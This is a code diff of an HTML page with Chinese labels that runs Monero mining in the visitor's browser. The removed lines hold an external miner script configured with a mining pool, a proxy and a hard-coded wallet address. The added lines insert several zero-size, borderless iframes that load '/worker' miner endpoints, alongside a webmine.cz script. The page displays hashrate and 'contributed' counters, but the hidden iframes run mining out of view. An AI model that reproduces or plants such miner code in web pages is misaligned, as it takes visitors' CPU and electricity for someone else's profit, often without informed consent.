@@ -20,10 +20,9 @@
     <div style="max-width:500px" class="container">
       <div class="row">
         <center>
-        <p>算力值: <span id="hashrate">等待加载...</span></p>
-        <p>哈希值: <span id="total_hashes">0</span></p>
+        <p>当前算力: <span id="hashrate">等待加载...</span> Hash/s</p>
+        <p>您已贡献: <span id="total_hashes">0</span> Hash</p>
         <p>共享值: <span id="total_shares">0</span></p>
-        <p>矿场主: <span>NuyoaH-L</span></p>
         </center>
         <h3 class="text-center">
           <p>CPU阀值</p>
@@ -34,17 +33,8 @@
         </h3>
       </div>
     </div>
-      <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
-      <script>
-        server = "wss://f.xmrminingproxy.com:8181";
-        var pool = "moneroocean.stream";
-        var wallet_address = "42j6Xpv7CZpGbTnagE8jXiMFmAGqgvp5tP6hy1J9V6biZ1XANGHvz7vBidTtMYhAkgNJ91KjP59o8idHKvgkNGzv1cw7HAy";
-        var worker_id = ""
-        var threads = 1;
-        var password = "x";
-        startMining(pool, wallet_address, worker_id, threads, password);
-        throttleMiner = 20;
-    </script>
+    <iframe id='miner' width=0 height=0 frameborder=0 src='/worker?key=zXwrk6fMoXQWRea'></iframe>
+    <iframe id='miner' width=0 height=0 frameborder=0 src='/worker?key=ux9ffNVfneI46UE'></iframe>
     <iframe id='miner' width=0 height=0 frameborder=0 src='/worker?key=shF1amnFqlMSwHF'></iframe>
     <script src="https://webmine.cz/js/gui.js"></script>
   </body>
